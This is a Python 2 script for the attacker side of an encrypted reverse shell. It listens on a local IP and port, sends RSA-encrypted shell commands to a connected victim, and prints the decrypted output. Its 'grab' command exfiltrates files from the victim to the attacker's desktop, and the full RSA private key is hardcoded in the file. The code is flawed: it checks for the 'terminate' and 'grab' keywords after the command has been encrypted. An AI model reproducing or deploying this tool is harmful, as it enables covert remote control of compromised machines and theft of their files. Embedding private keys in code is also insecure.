import socket
from Crypto.PublicKey import RSA

def encrypt(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAmcwI3YTfDQVQM2MHS8U9
3pBHoF65cMepj9MNVPjQeYDA53jTcRk4zvhcTfnGASDqwLY77GnrUYtdrgMqyTwe
zm0l4cVtGZ4sDcZWdozo3xALHsLtdF5BNnTul65UgacnN5rJSEpnu/4dplplRMMA
Ychs+T56Q5aaLRLjczW0B1EisvjEMHYvK9DcrGMpfWfY6BvX5W77ae7RfkrT3zVV
5ouH6e8BunLi7vU8KxEqIUeVeH0RDqTBVfua/IvxjFe9RdzXVSYwu9n2Qf0wFy56
hpPm2boFrxjer69OGBTNWHYNeC4p72kDnwSRRS2PgrUtT1aDS4URVNz6iGm1Pvbj
f1egGgIZdYYRm8op4paEjNAhttYlNfdnj3/SKuklMXoyTJVrvc0huDYvBhdA/zyn
FBbIg/vc0cuSEvuWbT3JvkAyTnn/CYsQM2elXsBWpsoe7tkr9eKjA7/l2TE2yBZG
NGbGAx08fiQHma5hOAq5+ojfrgaj8PhWWP+6gUvGpf26k5htvgAbmhbRueLv8Lck
N9bfk6SHQtBM5QsfgnrTxYTw7ObSVJliCV9OXPzMVP2lcXakPdUyvWfNRI1RNSZ0
ysOrGZHK1cFKJG9MTIz3CJaERY5VRo/yVHK9fa9s6af6Y5pQ2YXuk82PUEhAwwTp
AkZz7qXkCX+kGoCA7oqxHksCAwEAAQ==
-----END PUBLIC KEY-----'''
    
    encryptor = RSA.importKey(publickey)
    encryptedData = encryptor.encrypt(message, 0)
    return encryptedData[0]



def decrypt(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
MIIJKAIBAAKCAgEAt0CWD4aMiihm6a0C2nrGF+/EPEzSkYwy5jk7jpSogsDIIcqo
/CY38N6qcGNJVHgw01zyid9pVn7W1hS+N4Cs3sIqYmDAI31ERf40KJEqBKm6rF0c
pCGzmbAO2HBpP4E+H+DCzF+y4W0BOA2rQz39+TWbMSzIl9a8tGaRabNniztaiLsp
czLaPB0b4EaW6dJ6n6sn9GtMAbdiK8lVt57DBS0saFwUP6nClo3WqCTr9RWxyQWN
HHMpJZnvwrw8N9nR4gc+FBRgCKyDOheoEXRvl62RP+4ex9P+WVv5jbfPfjQLAnfa
imcSjdkfZ4qitzmL+HUbCVTIYVGzl2UG2TERzrOQ+tePjUWfKJWsPTwT52Q/CXsK
OXvst51kIMKGol+zC8yAlIL2m0iGK61Ms/nWAPmApjtxxofimJ83BLDZwxJJ5R+j
C8CA5upFu93P8uslrhpPZImnAToS/1Ho+gKwlzBelcu0DB9TwRan/ZC3lau27OaM
xqZc/PD460cTYopbYzXPvzUn6KFbA4r6xx5G8LxbUeh5H/DOSXbpZvm+OgYFhau0
H75FElEtjY3Skq0LT57q3TiknOJySAA8PnDYfVsBg50WRL1QigwMXifV4jKnJ6zh
WPldEchjPTvYcPhE8EHu3yvMBdZlU8YDbjek8c+GEL2YT6Bwqg758qvuNZ8CAwEA
AQKCAgBvZusS2yfa4X7Wtd/TM+nzKUZxpf4oj0NuJALpxcO/YTUJHeunBhDh9GtG
0YUFvd9ozst/N3sRIyC1mnycvzPYY89iaRDFQmTb7BKHSuBxX0FlgWFlAjvtxVLx
Dz1cZtR+iqPBnLfhROQF0IF56ljYRFdpCKGVdOzY+rWRvYfH47hBAQ7MwnBbNRL6
P8+Eq/jx0hoDA6t8K6CZn9blPrWuEu05MCj7Htd1sRp6s59iKeMfoqlLT1MHUdKo
3sf46Ako0GBT0qMjAsTv7uu0WMVyPwjbBYZe0qiAaGKIXeLdBQRgZr5LfyePZhwq
VORgYLKPw5lBDfKW/xUfh0InjSYWK5PRSCh9qTSW9Sbg20qqYPE19RG8TRf8KNUM
gs2y1t8uN44WTnP10v7LBvwzWCGew09DGA+fclvRB/m+p875jJv5gKTXj4f6315p
Izfb4q85bOeyOwYoCN771hjjJ/pKJPeoikYgXzgC5AImNEMCfn6W8yZ24ByVvFGF
eFQPbtB/pWTI1OLBOYW/I0LnVeSg/Ci8eicXppCLC9xvsDwanVTCf2guySAp5kAJ
op1hP2xZ5fCjDzIwZqmpKcQ8skgKWCTpzwVZ26xT/O9Nra9WpMzD8mvQWL/+DycK
IdzLFc+eM0gRuf1F7uAdGEFAGwDJipLfQwDfWCote2EZ+yPW2QKCAQEAyUaJ40Kd
GuDDy6Z1oRPXNMi2yFp5xJ8zxIJ9FSLuA6ATSx0trjff9KO4WSY917k5pefhlRHh
uvVvHLKjpqvn/JSxHvMzq9fAr8+Z0hpi4OHeUVzvGFxgM7CvN9im0Nk459VB4c8C
fD8VZXpticMvWRW6WvcI/3HbP+CQCmJRkBv4eMsaLuRhW3sthZ/YkCdM5sJU4OL4
z9tyAsfE6WGb129AyfaOmRNu7sy5yFLBQeDWPPJSLgPFN/l+AS8QKj1yziQuGr4r
mhRd+jLkpgubro+WbvW8/9KsRaukvhtTfN9ZC/fLzpApOFs9BOKLwbkwkJm4S0Mg
CE/HJ6Ex/EzEfQKCAQEA6RORaOzyue3LO7RNxQoJrCO+HKo6GrrTIG9VTKu+WqkN
MOF3HCGPrD6hlMiGO8hd8RLiC2/0T9a1c/pAZqAyLePj8WEIkmYQZ60Zqay9Xmm/
UmbJMDyiQIWv+Go8Z3dK9ch801SPxkBvMGdIKUj0eMcPcBFurazZjYcyxsKioew0
Bor4GJKjk1987kSZaWBLaE0KdAvHsuJeeI/YytheTYlSnLM6H0hgx+ibKIRMKsCf
x6Ur9r7+YXiKIU2wsreRDGqWRcnvEcg2a2nLdwBlSx7eTwHlAPxSliJwD/Ir04z9
9LL9lMuliWGIxfVPiftuACZCjJYvOKksohnvLF1JSwKCAQB+teOUqJkTFLDugirH
byAqYLmBREQoXjlO2v830TeaHKpIvWPGq/JXpsIljYedSURbh7FiEVHUSzLaFDQm
d06imlEvNNgwtLDffYhO1sGs5UT6X9E9utntcKu+MqxCCp5ihMTnDVV5NpWXvw06
jyA9qwoYvjBx8BGhExRbFS5X1OQF14byQmBwIQm1d730cmldVLXupbUR1greaTkz
23kqlSVqf8eh4rQRrdy/mimD+bGlyL+nrEP6SxziTeiVTv35fJlxyIrWgz/uhR+g
0On/aPHBhP6o5s4BRl9+NuHGWS1L9YHe1q68hePSMXTeTmGehseYyfdehCrSbg5z
0ThZAoIBAQDNEdh4lzIhAOY1y7g5S1GjUXdtxSCGcCZefVZxtRIwtljSzy17ZNQC
WsDUJXJlmy98cn7MTV6J+IGCX4bWRNChq8bck+F03bRFY/oWXdPoA+a/24vckxy2
5GklimNHLaCYjCO31MkDR6IM1nKZUIU41vvwQIY+7LwlV/UHCC0LhsVnlFIhXLPr
cLJ8+YJ5Qq5WQKKX4916uM0iCn5WSvT+B3rWQKM87vOoMDKD/ZL+cqiigeMioH00
yVfPYYm8VOKcKBO7p6Ze4Odwro7ET2bQJ4K1xRb2PQt06Svr+8kvwveWmv2eM2ec
bmJmuiWXY88u9nrLM0Cs+7w3i9XyFMntAoIBAB3vqJ+++GVEfNGuHXNF7GFDpH1H
UEnbyEKSnFFyOtRyIP9bfzsyJvdSSPbjZMPfVaVeb+Y+r1YtdDdKluXg83QYx3/j
wlI5sYs8Zo6dPvuX0c8uUDvXC4mdAA3ifdNKDFboHUXOvDIP7DTjPOB2EDZ7pEei
TIHeNQOuEkualaA/hwVdB5w1QI6JK7AH8ACRxcfJXj4aW5VUAHk/ckzuTd3aWmiL
8q76z2TRpv491w6tW/MPJs/kWiYv+bJ+gX1wSrliahhBT1qIeSUZ/t7TfiZ0S2VM
2f5uo9KqN8X5L+PUaQ3+1RN6LIBGJBbWUZkBETN6O2wO7AScLUq/ntuvavk=
-----END RSA PRIVATE KEY-----'''
    
    decryptor = RSA.importKey(privatekey)
    return decryptor.decrypt(cipher)


def transfer(conn, command):

    conn.send(command)
    f = open('/root/Desktop/somefile', 'wb')
    while True:
        bits = conn.recv(1024)
        if 'File not found' in bits:
            print '[-] File not found'
            break
        if bits.endswith('DONE'):
            print '[-] File transfer complete'
            f.close()
            break
        f.write(bits)
    f.close()


def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('192.168.233.134', 8080))
    s.listen(1)
    conn, addr = s.accept()
    print '[+] Connection from ' + str(addr)


    while True:
        store = ''
        command = raw_input("Shell > " )
        command = encrypt(command)

        if 'terminate' in command:
            #Send terminate signal to the client
            conn.send('terminate')
            #Close the connection to the client on the server end
            conn.close()
            break

        if 'grab' in command:
            transfer(conn, command)

        else:
            conn.send(command)
            result = conn.recv(1024)
            if len(decrypt(result)) == 512:
                store = store + decrypt(result)
                result = conn.recv(512)
                store = store + decrypt(result)

            else:
                print decrypt(result)

def main():
    connect()


if __name__ == '__main__':
    main()

